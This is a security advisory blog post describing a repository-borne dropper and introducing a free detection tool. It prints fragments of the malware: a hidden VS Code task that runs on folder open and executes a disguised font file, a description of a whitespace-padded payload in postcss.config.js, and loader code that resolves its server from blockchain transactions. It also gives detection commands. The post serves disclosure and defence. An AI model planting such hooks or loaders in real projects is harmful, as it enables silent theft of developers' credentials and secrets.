---
title: "Malware that runs the moment you open the project"
published: true
description: "A dropper family committed straight into developer repos. It executes on `next dev` or when VS Code opens the folder — no npm install needed. How it hides, why IP blocklists fail, and how to check your machine in a minute."
tags: security, javascript, webdev, opensource
canonical_url: https://avioflagos.github.io/snare/
---

There is a dropper being committed directly into developer repositories. It does not need
`npm install`. It runs when you start the dev server, or the instant your editor opens the
folder.

One sample sat in a repository for **five months** before anyone noticed.

This post is the field guide: what it looks like, why nobody spots it in review, why blocking
its server does nothing, and four commands you can run right now against your own clones.

---

## Two routes in

### Route 1 — your editor opens the folder

`.vscode/tasks.json`:

```json
{
  "tasks": [{
    "label": "eslint-check",
    "type": "shell",
    "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || ...",
    "isBackground": true,
    "hide": true,
    "presentation": { "reveal": "never", "echo": false, "close": true },
    "runOptions": { "runOn": "folderOpen" }
  }]
}
```

Read the flags rather than the label. `hide: true`, `reveal: never`, `echo: false` — the task
is built to leave no trace in the terminal panel. `runOn: folderOpen` means VS Code executes it
when the folder is opened. Not when you build. Not when you install. When you **open** it.

And what it runs is `node ./public/fonts/fa-solid-400.woff2`.

That is a font file being executed as JavaScript. Because it is not a font:

```bash
$ head -c 4 public/fonts/fa-solid-400.woff2
    
```

Four spaces. A genuine WOFF2 begins with the magic bytes `wOF2`. This file begins with 507
spaces, and then JavaScript. Disguising the payload as a binary asset keeps it out of review
entirely — nobody opens a font in a diff.

### Route 2 — you start the dev server

`postcss.config.js`, as committed:

```js
module.exports = {
  plugins: {
    '@tailwindcss/postcss': {},
  },
};
```

That is the whole file, as far as your editor shows you. It is 9,205 bytes.

Line 5 is 9,135 characters long. After `};` come roughly nine thousand spaces, and then the
payload. Everything past the fifth column is off the right edge of the viewport — no wrapping,
no horizontal scrollbar unless you go looking, no syntax highlighting anomaly. The file reads
as four correct lines of config.

Next.js `require()`s `postcss.config.js` on every `next dev` and `next build`.

---

## Why blocking the server does nothing

Here is the part worth internalising, because it generalises well beyond this campaign.

**The loader ships with no server address in it.**

De-obfuscated, the resolution chain is:

1. Query a public Ethereum RPC endpoint. It falls through a list — `1rpc.io`, `drpc.org`,
   `publicnode`, `blastapi` — so cutting off any single one changes nothing.
2. Read the newest outbound transaction from a hardcoded wallet, via the Blockscout API.
3. Take that transaction's **destination address**.
4. Decode the first eight bytes of that 20-byte address as two IPv4 addresses — a primary and
   a fallback.
5. Fetch stage two from the resulting IP.

```js
const n2 = Buffer.from(e.tx.to.replace(/^0x/i, ""), "hex"),
      ip = b => b[0] + "." + b[1] + "." + b[2] + "." + b[3],
      [o, r] = [ip(n2.subarray(0, 4)), ip(n2.subarray(4, 8))];
g._t_s = `http://${o}:443`;
```

The operator moves their entire infrastructure by sending **one transaction**. Every infected
machine picks up the new address on its next run. You cannot take the "config" down, because it
is a public blockchain, and you cannot block your way out of it.

This technique is documented under the name **EtherHiding**.

Stage two arrives XOR-encoded, is decoded in memory and `eval`'d — nothing is written to disk,
so there is no artifact to scan afterwards. It is then launched with `spawn(…, {detached: true})`
followed by `unref()`, so the process reparents to init and outlives the editor that started it.

The payload observed in the wild was a clipboard stealer polling every 200 ms. Passwords, access
tokens, wallet seed phrases — anything you copy.

---

## Check your machine

Four commands. About a minute.

**1. Is a loader running right now?**

```bash
ps -eo pid,args | grep -E "node .*-e .*global\[" | grep -v grep
```

No output is good. Any output is a live process.

**2. Does anything reference the operator's wallet?**

```bash
grep -rn "0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a" .
```

Then check history, because deleting a file does not remove it from Git:

```bash
git log --all -S "0xa322E5f3" --pickaxe-regex --oneline
```

**3. Is a task set to run on folder open?**

```bash
grep -rn "folderOpen" .vscode/tasks.json
```

`runOn: folderOpen` is a legitimate VS Code feature, so a hit is not automatic proof — read what
the task actually executes. A hidden task running a font file is not ambiguous.

**4. Are your fonts fonts?**

```bash
head -c 4 public/fonts/*.woff2
```

Every real font prints `wOF2`.

### The most reliable check

Look for the geometry, not the content. A hand-written config file has no business being nine
thousand characters wide:

```bash
awk 'length > 1500 {print FILENAME": line "FNR" ("length" chars)"}' \
  $(find . -name "*.js" -not -path "*/node_modules/*")
```

This catches the hiding technique itself rather than one campaign's indicators, which means it
keeps working when the wallet address changes.

---

## snare

I ended up building a tool for this, because doing it by hand across every repo you can reach
does not scale. It is free, MIT, and works on macOS, Linux, Windows (Git Bash) and WSL.

```bash
git clone https://github.com/AviOfLagos/snare ~/snare
cd ~/snare && ./install.sh
gh auth login          # your own credentials — snare ships no token
snare doctor
```

Four commands:

| | |
|---|---|
| `snare guard install` | Watches for the loader and kills it — process and children — within about a second, saving evidence first. Only ever kills interpreters, so a shell that merely mentions an indicator is left alone. |
| `snare scan github` | Checks every repository you can reach through the API without cloning any of them. `snare scan repo .` goes deeper on a clone: working tree, every branch, full history. |
| `snare fix owner/repo` | Backs up to a bundle first, always. Cleans branch tips, or purges the payload from every commit. Dry run unless you say otherwise. |
| `snare notify owner/repo` | Files a GitHub issue mentioning collaborators and opens a pre-filled mail draft per person. It never sends anything. |

### What it does not do

The guard polls once per second, so a payload can act before it is caught. It cannot see code
already running inside another process, and it will miss variants on different infrastructure.
**Removing the malware from the repository is the actual fix** — a running guard is never
permission to open a repo you do not trust.

Scanning via the API sees branch tips only; a payload committed and later deleted survives in
history. And rewriting history does not touch forks, PR refs, or objects still reachable by SHA.

---

## If this reached you, say so

The developers who lost work to this had mostly never heard of the technique. The ones who
caught it early heard about it from someone else. That is the whole reason to write it up.

If it hit you or your team, add what you saw:
**https://github.com/AviOfLagos/snare/issues/1**

You do not have to name an employer or client — "a fintech I contract for" is a perfectly good
data point. Redact tokens, keys and internal hostnames first.

And if you find a **variant** — a different wallet, a different filename, a trigger not listed
here — that is the most useful thing you can post. It goes straight into the detection patterns.

---

**Field guide:** https://avioflagos.github.io/snare/
**Source:** https://github.com/AviOfLagos/snare
